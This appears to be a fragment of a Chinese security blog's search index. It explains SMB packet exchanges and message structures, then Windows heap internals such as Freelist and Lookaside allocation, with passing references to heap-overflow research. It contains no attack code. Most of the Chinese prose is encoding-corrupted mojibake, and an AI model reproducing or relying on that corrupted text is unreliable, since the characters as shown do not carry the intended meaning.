SMBåè®®æ¶‰åŠåˆ°çš„æ•°æ®åŒ…åˆ†æ Packet1. SMB_COM_NEGOTIATE Direction:C-\u003eS\rDescription:clientæƒ³serverå‘é€smb dialectçš„ç¡®è®¤ä¿¡æ¯ï¼Œserverè¿”å›ä¸€ä¸ªåŒ…å«ç€dialects\rçš„å­—ç¬¦ä¸²çš„æ•°æ®åŒ…ã€‚\rPacket2. SMB_COM_NEGOTIATE Direction:S-\u003eC\rDescription:serverç›¸åº”clientçš„è¯·æ±‚ï¼Œç¡®å®šå°†åœ¨sessionä¸­ä½¿ç”¨çš„smb dialectã€‚serverè¿”å›\rçš„æ•°æ®åŒ…ä¸­è¿˜åŒ…æ‹¬ä¸€ä¸ª8å­—èŠ‚çš„éšæœºå­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²å°†åœ¨ç³»ä¸€éƒ¨ä¸­ç”¨äºåœ¨ç™»å½•è¿‡ç¨‹ä¸­å¯¹å®¢æˆ·ç«¯\rè¿›è¡Œèº«ä»½éªŒè¯ã€‚\rPacket3. SMB_COM_SESSION_SETUP_ANDX Direction:C-\u003eS\rDescription:è¯¥æ•°æ®åŒ…åŒ…å«ç€æœ‰å…³clientåŠŸèƒ½çš„ä¿¡æ¯ï¼Œå› æ­¤å³ä½¿serverå®ç°äº†share-level\rsecurity modelï¼Œä¹Ÿå¿…é¡»è¦å‘é€è¯¥æ•°æ®åŒ…ã€‚\rPacket4. SMB_COM_SESSION_SETUP_ANDX Direction:S-\u003eC\rDescription:å¦‚æœserveræ¥å—äº†challenge/responseï¼Œåˆ™è¿”å›ç»™clientçš„æ•°æ®åŒ…ä¸­å°†åŒ…å«\rä¸€ä¸ªæœ‰æ•ˆçš„UIDã€‚å¦‚æœä¸æ¥å—ï¼Œåˆ™åœ¨æ•°æ®åŒ…ä¸­è¿”å›error codeï¼Œå¹¶æ‹’ç»è®¿é—®ã€‚\rPacket5. SMB_COM_TREE_CONNECT_ANDX Directionï¼šC-\u003eS\rDescription:clientå¯¹shareå‘èµ·è®¿é—®ï¼Œè¯¥æ•°æ®åŒ…ä¸­åŒ…å«UNCæ ¼å¼çš„ç»å¯¹å…±äº«è·¯å¾„ã€‚\rPacket6. SMB_COM_TREE_CONNECT_ANDX Direction:S-\u003eC\rDescription:å¦‚æœserveræˆäºˆäº†clientè®¿é—®æƒé™ï¼Œåˆ™serverè¿”å›ä¸è¯¥æ•°æ®åŒ…ä¸­çš„shareå¯¹åº”çš„\r16ä½çš„TIDã€‚å¦‚æœshareä¸å­˜åœ¨æˆ–è€…clientæ²¡æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œåˆ™serverè¿”å›error codeå¹¶æ‹’ç»è®¿é—®ã€‚\rPacket7. SMB_COM_OPEN_ANDX Direction:C-\u003eS\rDescription:clientè¯·æ±‚serverä»£è¡¨è‡ªå·±åœ¨shareä¸­æ‰“å¼€æ–‡ä»¶ï¼Œè¯¥æ•°æ®åŒ…ä¸­åŒ…å«è¦æ‰“å¼€çš„æ–‡ä»¶çš„åç§°ã€‚\rPacket8. SMB_COM_OPEN_ANDX Direction:S-\u003eC\rDescription:å¦‚æœæˆäºˆäº†å¯¹æ–‡ä»¶çš„è®¿é—®æƒé™ï¼Œåˆ™serverè¿”å›è¯·æ±‚æ–‡ä»¶çš„IDï¼›å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…\rç”¨æˆ·æ²¡æœ‰è¶³å¤Ÿçš„æƒé™è®¿é—®è¯¥æ–‡ä»¶ï¼Œåˆ™è¿”å›error codeå¹¶æ‹’ç»clientçš„è®¿é—®ã€‚\rPacket9. SMB_COM_READ_ANDX Direction:C-\u003eS\rDescription:clientè¯·æ±‚serverä»£æ›¿è‡ªå·±è¯»å–æ–‡ä»¶ä¸­çš„æ•°æ®å¹¶è¿”å›ç»™è‡ªå·±ã€‚æ‰“å¼€æ–‡ä»¶æ—¶client\rè·å–çš„æ–‡ä»¶IDåŒ…å«åœ¨è¯¥æ•°æ®åŒ…ä¸­ï¼Œä»¥ä¾¿è¯†åˆ«serveråº”è¯¥ä»å“ªä¸ªæ‰“å¼€çš„æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚\rPacket10. SMB_COM_READ_ANDX Direction:S-\u003eC\rDescriptionï¼šserverè¿”å›clientè¯·æ±‚çš„æ–‡ä»¶æ•°æ®ã€‚ç”±äºå·²æˆäºˆå¯¹serverï¼Œshareå’Œæ–‡ä»¶çš„è®¿é—®\ræƒé™ï¼Œä¸€èˆ¬ä¸ä¼šå‡ºç°é—®é¢˜ã€‚ä½†æ˜¯åœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ä¼šå‘ç”Ÿé”™è¯¯ï¼Œä¾‹å¦‚åœ¨æ‰“å¼€æ–‡ä»¶å’Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®\rè¿™ä¸¤æ­¥ä¹‹é—´ï¼Œå¯¹shareçš„è®¿é—®æƒé™é­åˆ°äº†æ›´æ”¹ï¼Œå°±ä¼šå‘ç”Ÿé”™è¯¯ã€‚\r","date":"2019-12-24","objectID":"/2019/12/smb/:1:2","tags":["SMB"],"title":"SMB åè®®ç®€å•æ€»ç»“","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"ä¸‰. SMB Messageç»“æ„ SMB MessageåŒ…æ‹¬ä¸€ä¸ªå›ºå®šé•¿åº¦çš„headerï¼ˆ32å­—èŠ‚ï¼‰ã€ä¸€ä¸ªå¯å˜é•¿åº¦çš„Parameter blockï¼ˆæœ€å¤§\rä¸º64kbï¼‰ã€ä¸€ä¸ªå¯å˜é•¿åº¦çš„Data blockã€‚\rThe SMB Message Header 32å­—èŠ‚çš„å›ºå®šé•¿åº¦ã€‚\rSMB_Header\r{\rUCHAR Protocol[4];\rUCHAR Command;\rSMB_ERROR Status;\rUCHAR Flags;\rUSHORT Flags2;\rUSHORT PIDHigh;\rUCHAR SecurityFeatures[8];\rUSHORT Reserved;\rUSHORT TID;\rUSHORT PIDLow;\rUSHORT UID;\rUSHORT MID;\r}\rç®€å•è¯´ä¸€ä¸‹æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†ï¼š\rProtocol:(4 å­—èŠ‚)éœ€è¦åŒ…å«\"\\xff\",â€œSâ€,â€œMâ€,â€œBâ€ Flags2:ä¿ç•™ä½å¿…é¡»è®¾ç½®ä¸º0ï¼Œä¸”éœ€è¦é‡ç‚¹å…³æ³¨SMB_FLAGS2_DFSå­—æ®µï¼Œå¦‚æœè¯¥ä½è¢«è®¾ç½®ä¸º1ï¼Œåˆ™ä»»ä½•çš„æ–‡ä»¶è·¯å¾„åéƒ½åº”è¯¥åœ¨DFSä¸­è¿›è¡Œå¤„ç†ï¼ˆè¿™ä¹Ÿæ˜¯å¾ˆå¤šæ¼æ´è§¦å‘ç‚¹ï¼Œå› ä¸ºå¯¹äºæ–‡ä»¶è·¯å¾„è§„èŒƒåŒ–å¤„ç†å‡½æ•°ï¼Œæœ‰æ¼æ´ï¼‰ SecuritySignature (8 bytes): å¦‚æœå·²åå•†SMBç­¾åï¼Œåˆ™æ­¤å­—æ®µå¿…é¡»åŒ…å«ä¸€ä¸ª8å­—èŠ‚çš„åŠ å¯†æ¶ˆæ¯ç­¾åï¼Œå¯ç”¨äºæ£€æµ‹æ¶ˆæ¯æ˜¯å¦åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ã€‚ æ¶ˆæ¯ç­¾åçš„ä½¿ç”¨ä¸æ— è¿æ¥ä¼ è¾“æ˜¯äº’æ–¥çš„ã€‚ Parameter Block åœ¨CIFSæ–¹è¨€ä¸­ï¼ŒSMB_Parameters.Wordsæ•°ç»„å¯ä»¥åŒ…å«ä»»æ„ç»“æ„ã€‚ SMB_Parameters.Wordsç»“æ„çš„æ ¼å¼æ˜¯é’ˆå¯¹æ¯ä¸ªå‘½ä»¤æ¶ˆæ¯å•ç‹¬å®šä¹‰çš„ã€‚ Wordsæ•°ç»„çš„å¤§å°ä»ç„¶è¢«æµ‹é‡ä¸ºå­—èŠ‚å¯¹çš„è®¡æ•°ã€‚å…¶ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š SMB_Parameters\r{\rUCHAR WordCount;\rUSHORT Words[WordCount] (variable);\r}\rWords (variable): The message-specific parameters structure. The size of this field MUST be (2 x WordCount) bytes. If WordCount is 0x00, this field is not included. Data Block ç»“æ„ä¸Parameter Blockç›¸ä¼¼ï¼š\rSMB_Data\r{\rUSHORT ByteCount;\rUCHAR Bytes[ByteCount] (variable);\r}\rBatched Message(AndX Messages) ä¸»è¦æ˜¯ä¸ºäº†åœ¨ä¸€ä¸ªmessageä¸­å‘é€å¤šä¸ªrequestæˆ–è€…response commandï¼Œè€Œåªéœ€è¦ä¸€ä¸ªsmb headerå³å¯ã€‚\rIn AndX Messages, only one SMB Header (section 2.2.3.1) is sent. The header is then followed by zero or more Parameter and Data block pairs, each corresponding to an additional command request/response. There is no limit on the number of block pairs in a message specifically, only on the total message size. *The total size of a Batched Message MUST NOT exceed the negotiated MaxBufferSize.* AndX Messages contain a construct, conceptually similar to a linked-list, that is used to connect the batched block pairs. The resulting list is referred to as an AndX Chain.\rå…¶ç»“æ„å¦‚ä¸‹ï¼š\rAndX\r{\rUCHAR AndXCommand;\rUCHAR AndXReserved;\rUSHORT AndXOffset;\r}\rAndXOffset (2 bytes): The offset in bytes, relative to the start of the SMB Header, of the next Parameter block in the AndX Message. This offset is independent of any other size parameters or offsets within the command. This offset can point to a location past the end of the current block pair. The AndX construct is located at the start of the Parameter block of an AndX command request/response. ","date":"2019-12-24","objectID":"/2019/12/smb/:2:0","tags":["SMB"],"title":"SMB åè®®ç®€å•æ€»ç»“","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"å››. SMB COMMANDS ç”±äºcommandsæ•°é‡è¾ƒå¤šï¼Œæ­¤å¤„ç»™å‡ºå¾®è½¯å®˜æ–¹çš„å‘½ä»¤è§£é‡Šåœ°å€ã€‚\r[Microsoft Docs]: \u003chttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/5cd5747f-fe0b-40a6-89d0-d67f751f8232\u003e\râ€‹ ","date":"2019-12-24","objectID":"/2019/12/smb/:3:0","tags":["SMB"],"title":"SMB åè®®ç®€å•æ€»ç»“","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"Windows Heap çŸ¥è¯†æ€»ç»“","date":"2019-11-24","objectID":"/2019/11/windows-heap/","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"Windows Heap æ¼«æ¸¸ åœ¨ç³»ç»Ÿå®‰å…¨ç ”ç©¶ä¸­ï¼Œå †ï¼Œæ˜¯ä¸€ä¸ªæå…¶é‡è¦çš„å†…å­˜åŒºåŸŸä»¥åŠç ”ç©¶çš„çƒ­ç‚¹ã€‚å †ï¼ŒåŒºåˆ«äºæ ˆåŒºã€å…¨å±€æ•°æ®åŒºä»¥åŠä»£ç åŒºï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°ç”³è¯·æŸä¸ªå¤§å°çš„å†…å­˜ç©ºé—´ã€‚æœ¬æ–‡å°†ä»å®è§‚åˆ°å¾®è§‚ï¼Œç®€å•æ¢³ç†æ€»ç»“ä¸€ä¸‹Windowsç³»ç»Ÿä¸­çš„å †ç›¸å…³çš„çŸ¥è¯†ä»¥åŠå¸¸è§çš„å †åˆ©ç”¨æ¼æ´ï¼Œæ–¹ä¾¿è‡ªå·±åç»­çš„å­¦ä¹ ã€‚ Windowså †çš„å†å² åˆ°ç›®å‰ä¸ºæ­¢ï¼Œç”±äºå¾®è½¯å¹¶æ²¡æœ‰å®Œå…¨å…¬å¼€Windowsä¸­å †ç®¡ç†çš„ç»†èŠ‚ï¼Œæ‰€ä»¥ç°åœ¨å¯¹Windowsä¸‹å †çš„äº†è§£éƒ½æ˜¯åŸºäºæŠ€æœ¯çˆ±å¥½è€…ã€é»‘å®¢ã€å®‰å…¨ä¸“å®¶ä»¥åŠé€†å‘å·¥ç¨‹å¸ˆç­‰çš„ä¸ªäººç ”ç©¶æˆæœã€‚è¿™äº›å‰è¾ˆçš„åŠªåŠ›å·¥ä½œï¼Œä¸ºæˆ‘ä»¬ç•™ä¸‹äº†æå…¶å®è´µçš„ç ”ç©¶èµ„æ–™ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥åŸºæœ¬æ¸…æ¥šäº†éƒ¨åˆ†Windowsç³»ç»Ÿä¸­çš„å †ç®¡ç†ç­–ç•¥ã€ä¸æ”»å‡»ç›¸å…³çš„æ•°æ®ç»“æ„å’Œç®—æ³•ç­‰ã€‚æ­¤å¤„ï¼Œæœ‰å‡ ä½æŠ€æœ¯ç²¾æ¹›ã€è´¡çŒ®å“è¶Šçš„å‰è¾ˆå€¼å¾—æˆ‘ä»¬é“­è®°ï¼š Halvar Flakeï¼š2002å¹´çš„Black Hatå¤§ä¼šä¸Šï¼Œä»–åœ¨æ¼”è®²â€œThird Generation Exploitationâ€ä¸­é¦–æ¬¡æŒ‘æˆ˜Windowsçš„å †æº¢å‡ºï¼Œå¹¶æ­ç§˜äº†å †ä¸­ä¸€äº›é‡è¦çš„æ•°æ®ç»“æ„å’Œç®—æ³•ã€‚ David Litchfield: David åœ¨2004å¹´çš„Black Hatä¸Šæ¼”è®²çš„\"Windows Heap Overflows\"é¦–æ¬¡æ¯”è¾ƒå…¨é¢åœ°ä»‹ç»äº†Windows 2000å¹³å°ä¸‹å †æº¢å‡ºåœ°æŠ€æœ¯ç»†èŠ‚ï¼ŒåŒ…æ‹¬é‡è¦æ•°æ®ç»“æ„ã€å †åˆ†é…ç®—æ³•ã€åˆ©ç”¨æ€è·¯ã€åŠ«æŒè¿›ç¨‹åœ°æ–¹æ³•ã€æ‰§è¡Œshellcodeæ—¶ä¼šé‡åˆ°çš„é—®é¢˜ç­‰ã€‚ Matt Conover: åœ¨å…¶æ¼”è®²çš„\"XP SP2 Heap Exploitation\"ä¸­å…¨é¢æ­ç¤ºäº†Windowså †ä¸­ä¸æº¢å‡ºç›¸å…³çš„æ‰€æœ‰æ•°æ®ç»“æ„å’Œåˆ†é…ç­–ç•¥ï¼Œè€Œä¸”è¿˜æå‡ºäº†çªç ´Windows XP SP2å¹³å°ä¸‹è¯¸å¤šå®‰å…¨æœºåˆ¶çš„é˜²æŠ¤è¿›è¡Œå †æº¢å‡ºçš„æ–¹æ³•ã€‚ Windowså †çš„æ•°æ®ç»“æ„ä¸ç®¡ç†æœºåˆ¶ å †ä¸åŒäºæ ˆï¼Œå…¶ç®¡ç†æœºåˆ¶é”™ç»¼ç¹æ‚ï¼Œæ“ä½œç³»ç»Ÿä¸€èˆ¬ä¼šç›´æ¥æä¾›ä¸€å¥—APIæ¥å°†åº•å±‚çš„å¤æ‚çš„å †ç®¡ç†å±è”½æ‰ã€‚ç¨‹åºå‘˜åœ¨ä½¿ç”¨å †æ—¶å¯ä»¥åªåšä¸‰ä»¶äº‹ï¼šç”³è¯·ä¸€å®šå¤§å°çš„å†…å­˜ã€ä½¿ç”¨å†…å­˜ã€é‡Šæ”¾å†…å­˜ã€‚ è™½ç„¶å¯¹äºç¨‹åºå‘˜æ¥è¯´ï¼Œå¯¹å †çš„æ“ä½œå˜å¾—ç®€å•ï¼Œä½†æ˜¯å¯¹äºå †ç®¡ç†ç³»ç»Ÿæ¥è¯´ï¼Œéœ€è¦æœ‰ä¸€å¥—å®Œå–„çš„æœºåˆ¶æ¥å“åº”ç¨‹åºçš„å†…å­˜ä½¿ç”¨ç”³è¯·ï¼Œè¿™æ„å‘³ç€éœ€è¦åœ¨â€œæ‚ä¹±â€çš„å †åŒºä¸­â€œå¯»æ‰¾â€åˆ°â€œåˆé€‚â€çš„ã€ç©ºé—²çš„å†…å­˜åŒºåŸŸï¼Œä»¥æŒ‡é’ˆå½¢å¼è¿”å›ç»™ç¨‹åºã€‚ â€œæ‚ä¹±â€ï¼šå †åŒºåœ¨ç»è¿‡åå¤çš„ç”³è¯·ã€é‡Šæ”¾æ“ä½œåï¼ŒåŸæœ¬å¤§ç‰‡è¿ç»­çš„ç©ºé—²å†…å­˜åŒºåŸŸå¯èƒ½å˜å¾—æ”¯ç¦»ç ´ç¢ï¼Œå‘ˆç°å‡ºå¤§å°ä¸ç­‰ä¸”ç©ºé—²å—ã€å ç”¨å—ç›¸é—´éš”çš„å‡Œä¹±çŠ¶æ€ã€‚ â€œå¯»æ‰¾â€ï¼šå †ç®¡ç†ç¨‹åºå¿…é¡»èƒ½å¤Ÿåœ¨â€œæ‚ä¹±â€çš„å †å†…å­˜åŒºåŸŸä¸­æ‰¾åˆ°ç¨‹åºç”³è¯·çš„å †å†…å­˜å—ï¼Œå¯»æ‰¾è¿‡ç¨‹ä¸­éœ€è¦è¾¨åˆ«å“ªäº›å †å—æ˜¯æ­£åœ¨ä½¿ç”¨çš„ï¼Œå“ªäº›å †å—æ˜¯å·²ç»é‡Šæ”¾çš„ï¼Œå¤„äºç©ºé—²çŠ¶æ€çš„ã€‚ â€œåˆé€‚â€ï¼šå †ç®¡ç†ç¨‹åºéœ€è¦æŒ‰éœ€åˆ†é…å †å†…å­˜ï¼Œä¸èƒ½è¿‡å¤§ä¹Ÿä¸èƒ½ä¸å¤Ÿï¼Œéœ€è¦â€œæ°åˆ°å¥½å¤„â€ã€‚ ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:0:0","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"å †ä¸­çš„æ•°æ®ç»“æ„ ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:1:0","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"å †å— ä¼ ç»Ÿå†…å­˜ç»Ÿè®¡å•ä½å¾€å¾€æ˜¯ä»¥å­—èŠ‚ä½æ ‡å‡†ï¼Œä½†å¤„äºæ€§èƒ½çš„è€ƒè™‘ï¼Œå †å†…å­˜æŒ‰ç…§å¤§å°ä¸åŒç»„æˆä¸åŒçš„å—ï¼Œä»¥å †å—ä¸ºå•ä½è¿›è¡Œæ ‡è¯†ã€‚ä¸€ä¸ªå †å—åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼šheaderéƒ¨åˆ†å’Œdataéƒ¨åˆ†ã€‚headeræ˜¯ä¸€ä¸ªå †å—å¤´éƒ¨çš„å‡ ä¸ªå­—èŠ‚ï¼Œç”¨æ¥æ ‡è¯†è¿™ä¸ªå †å—è‡ªèº«çš„ä¿¡æ¯ã€‚dataæ˜¯ç”¨æ¥åœ¨æœ€ç»ˆåˆ†é…ç»™ç”¨æˆ·ä½¿ç”¨çš„æ•°æ®åŒºã€‚\r","date":"2019-11-24","objectID":"/2019/11/windows-heap/:1:1","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"å †è¡¨ ä¸ºäº†åˆç†åœ°ç»„ç»‡å †åŒºä¸­çš„ç©ºé—²å †å—ï¼Œæå‡ºäº†å †è¡¨çš„æ¦‚å¿µã€‚å †è¡¨çš„æ•°æ®ç»“æ„å†³å®šäº†æ•´ä¸ªå †åŒºçš„ç»„ç»‡æ–¹å¼ï¼Œä¸€èˆ¬ä½äºå †åŒºçš„èµ·å§‹ä½ç½®ï¼Œç”¨äºç´¢å¼•å †åŒºä¸­ç©ºé—²å †å—çš„é‡è¦ä¿¡æ¯ï¼ŒåŒ…æ‹¬å †å—çš„ä½ç½®ã€å¤§å°ã€çŠ¶æ€ï¼ˆç©ºé—²orå ç”¨ï¼‰ã€‚\rä¸‹å›¾æ˜¯ä¸€ä¸ªç®€å•çš„å †å†…å­˜ç»„ç»‡å›¾ï¼š\rå †è¡¨å¹¶ä¸ç´¢å¼•æ‰€æœ‰çš„å †å—ã€‚åœ¨Windowsç³»ç»Ÿä¸­ï¼Œå¤„äºå ç”¨æ€çš„å †å—ç”±æ­£åœ¨ä½¿ç”¨å®ƒçš„ç¨‹åºç´¢å¼•ï¼Œå¤„äºç©ºé—²æ€çš„å †å—ç”±å †è¡¨ç´¢å¼•ã€‚ç©ºé—²çš„å †å—å¤§å°ä¸ä¸€ï¼Œè€Œä¸”å…¶ä½¿ç”¨é¢‘ç‡ä¸å®šã€‚å¯èƒ½è¾ƒå°çš„å †å—çš„ä½¿ç”¨é¢‘ç‡æ›´é«˜ï¼Œè¾ƒå¤§çš„ä½¿ç”¨é¢‘ç‡è¾ƒä½ï¼Œè¿™éœ€è¦å¯¹è¿™ä¸¤ç§æƒ…å†µè¿›è¡Œä¸åŒçš„ç´¢å¼•æ–¹å¼ä»¥æé«˜æ•ˆç‡ã€‚è¯¥é—®é¢˜ä¸»è¦é€šè¿‡ä¸åŒç±»å‹çš„å †è¡¨è¿›è¡Œè§£å†³ï¼Œå…¶ä¸­ï¼Œæœ€é‡è¦çš„å †è¡¨æœ‰ä¸¤ç§ï¼šç©ºé—²åŒå‘é“¾è¡¨Freelistå’Œå¿«é€Ÿå•å‘é“¾è¡¨Lookasideã€‚\r1. ç©ºé—²åŒå‘é“¾è¡¨Freelist é¡¾åæ€ä¹‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚åœ¨ç©ºé—²å †å—çš„headerä¸­æœ‰ä¸€å¯¹æŒ‡é’ˆï¼Œç”¨äºå°†ç©ºé—²å †å—é“¾æ¥æˆåŒå‘é“¾è¡¨ã€‚è€Œä¸”ï¼Œåœ¨è¯¥åŒå‘é“¾è¡¨ä¸­ï¼Œæ ¹æ®å †å—çš„å¤§å°ä¸åŒï¼Œä¸€å…±è¢«åˆ†æˆäº†128æ¡ã€‚ å¯¹äºè¿™128æ¡é“¾è¡¨çš„ç»„ç»‡ï¼Œç”±å †åŒºä¸€å¼€å§‹çš„å †è¡¨åŒºä¸­çš„ä¸€ä¸ªæœ‰128é¡¹çš„æŒ‡é’ˆæ•°ç»„ç´¢å¼•ï¼Œç§°ä¸ºFreelist arraryã€‚è¯¥æ•°ç»„çš„æ¯ä¸€é¡¹éƒ½åŒ…å«ä¸¤ä¸ªæŒ‡é’ˆï¼Œç”¨äºæ ‡è¯†ä¸€æ¡ç©ºé—²åŒå‘é“¾è¡¨ã€‚å…¶ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š ä»ä¸Šé¢ç©ºé—²åŒå‘é“¾è¡¨ç»“æ„å›¾ä¸­æˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°å®ƒçš„å†…éƒ¨ç»“æ„ã€‚ç¬¬äºŒé¡¹ç´¢å¼•free[1]æ ‡è¯†äº†å †åŒºä¸­æ‰€æœ‰å¤§å°ä¸º8å­—èŠ‚çš„ç©ºé—²å †å—ï¼Œç¬¬ä¸‰é¡¹ç´¢å¼•free[2]æ ‡è¯†äº†å †åŒºä¸­æ‰€æœ‰å¤§å°ä¸º16å­—èŠ‚çš„ç©ºé—²å †å—ï¼Œä¹‹åçš„æ¯å„ç´¢å¼•é¡¹æ ‡è¯†å †åŒºä¸­çš„ç©ºé—²å †å—éƒ½é€æ¬¡é€’å¢8å­—èŠ‚ï¼Œæœ€åä¸€ä¸ªç´¢å¼•é¡¹free[127]æ ‡è¯†çš„å †å—çš„å¤§å°ä¸º1016å­—èŠ‚ã€‚ç”±ä»¥ä¸Šæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ç©ºé—²å †å—å¤§å°ä¸ç´¢å¼•é¡¹ä¹‹é—´çš„å¯¹åº”å…³ç³»ï¼š ç©ºé—²å †å—å¤§å° = ç´¢å¼•é¡¹ * 8 ï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰ å°†ä¸åŒå¤§å°çš„ç©ºé—²å †å—æ”¾å…¥ä¸åŒçš„ç©ºé—²åŒå‘é“¾è¡¨ä¸­å°±å¯ä»¥æ–¹ä¾¿ã€é«˜æ•ˆåœ°å¯¹å †åŒºä¸­ä¸åŒå¤§å°çš„ç©ºé—²å †å—è¿›è¡Œç®¡ç†ï¼Œä¹Ÿå¯ä»¥æé«˜æ£€ç´¢æ•ˆç‡ã€‚ éœ€è¦é¢å¤–æ³¨æ„çš„æ˜¯ï¼Œä¸Šå›¾ä¸­çš„ç¬¬ä¸€ä¸ªç´¢å¼•é¡¹free[0]ï¼Œè¯¥é“¾è¡¨ç´¢å¼•çš„ç©ºé—²å †å—çš„å¤§å°ä¸æ»¡è¶³ä¸Šé¢çš„å…¬å¼ï¼Œè¯¥ç´¢å¼•é¡¹ä¸­é“¾æ¥çš„ç©ºé—²å †å—çš„å¤§å°éƒ½å¤§äºç­‰äº1024å­—èŠ‚ï¼ˆå°äº512KBï¼‰ï¼Œè¿™äº›ç©ºé—²å †å—æŒ‰ç…§å‡åºåœ¨free[0]é“¾è¡¨ä¸­ä¾æ¬¡æ’åˆ—ã€‚ 2. å¿«é€Ÿå•å‘é“¾è¡¨Lookaside ä¸Freelistä¸åŒï¼ŒLookasideæ˜¯ä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œè¿™æ˜¯Windowsä¸ºäº†åŠ é€Ÿå †å—åˆ†é…è€Œé‡‡ç”¨çš„ä¸€ç§å †è¡¨ã€‚Lookasideä¸­çš„ç©ºé—²å †å—ä»æ¥ä¸ä¼šå‘ç”Ÿå †å—åˆå¹¶ï¼ˆå…¶ä¸­çš„ç©ºé—²å †å—headerè¢«è®¾ç½®ä¸ºå ç”¨æ€ï¼Œä»¥é˜²æ­¢å †å—åˆå¹¶ï¼‰ï¼Œå› æ­¤å¯ä»¥å¤§å¤§æé«˜å †å—åˆ†é…çš„é€Ÿåº¦ã€‚ Lookasideä¸€å…±æœ‰128é¡¹ï¼Œæ¯ä¸€é¡¹ç´¢å¼•çš„ç©ºé—²å †å—éƒ½ä»¥å•é“¾è¡¨çš„å½¢å¼è¿›è¡Œç»„ç»‡ã€‚å…¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ­¤å¤–ï¼ŒLookasideè¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç‰¹ç‚¹ï¼Œå®ƒæ€»æ˜¯è¢«åˆå§‹åŒ–ä¸ºç©ºï¼Œè€Œä¸”æ¯æ¡Lookasideæœ€å¤šåªæœ‰4ä¸ªèŠ‚ç‚¹ã€‚ ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:1:2","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"å †ä¸­çš„å †å—æ“ä½œ ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:2:0","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"1. å †å—åˆ†é… å †å—çš„åˆ†é…å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼ŒLookasideåˆ†é…ã€æ™®é€šFreeliståˆ†é…ä»¥åŠ0å·Freelistï¼ˆfree[0]ï¼‰åˆ†é…ã€‚ Lookasideåˆ†é…: å¯»æ‰¾åˆ°å¤§å°åŒ¹é…çš„ç©ºé—²å †å— -\u003e ä¿®æ”¹çŠ¶æ€ä¸ºå ç”¨ -\u003e ä»å †è¡¨ä¸­è§£é“¾ -\u003e ç»™ç¨‹åºè¿”å›ä¸€ä¸ªæŒ‡å‘å †å—çš„æŒ‡é’ˆ æ™®é€šFreeliståˆ†é…ï¼š å¯»æ‰¾æœ€ä¼˜çš„ç©ºé—²å †å— -\u003e è‹¥å¤±è´¥ï¼Œå¯»æ‰¾æ¬¡ä¼˜ç©ºé—²å †å—åˆ†é… 0å·Freeliståˆ†é…ï¼š ä»free[0]åå‘å¯»æ‰¾æœ€åä¸€ä¸ªå †å—ï¼ˆæœ€å¤§çš„å †å—ï¼‰ -\u003e è‹¥æ»¡è¶³è¦æ±‚ï¼Œå†æ­£å‘æœç´¢æœ€å°çš„æ»¡è¶³è¦æ±‚çš„ç©ºé—²å †å— å †å—åˆ†é…ä¸­çš„â€œæ‰¾é›¶é’±â€ç°è±¡ï¼š å½“åœ¨Freelistä¸­æ— æ³•æ‰¾åˆ°åˆšå¥½åˆé€‚çš„å †å—æ—¶ï¼Œæ­¤æ—¶ä¼šåˆ†é…ä¸€ä¸ªç¨å¾®å¤§ä¸€ç‚¹çš„ç©ºé—²å †å—ç»™ç¨‹åºä½¿ç”¨ï¼Œå…¶è¿‡ç¨‹æ˜¯é¦–å…ˆåœ¨è¿™ä¸ªå¤§å—ä¸­åˆ†é…å‡ºå¤§å°åˆšå¥½ç­‰äºè¯·æ±‚å †å—å¤§å°çš„å †å—ç»™ç¨‹åºï¼Œç„¶åå‰©ä¸‹çš„éƒ¨åˆ†ä¿®æ”¹å †å—çš„headerä¿¡æ¯ï¼Œé‡æ–°é“¾å…¥åˆ°Freeliståˆé€‚çš„ä½ç½®ã€‚è¿™ç§æ–¹æ³•èŠ‚çº¦äº†å†…å­˜çš„ä½¿ç”¨ï¼Œä¸ä¼šé€ æˆå¤§é‡çš„å†…å­˜æµªè´¹ã€‚ ç”±äºLookasideåªæœ‰åœ¨ç²¾ç¡®åŒ¹é…æ—¶æ‰ä¼šåˆ†é…ï¼Œå› æ­¤ä¸å­˜åœ¨â€œæ‰¾é›¶é’±â€ç°è±¡ã€‚ 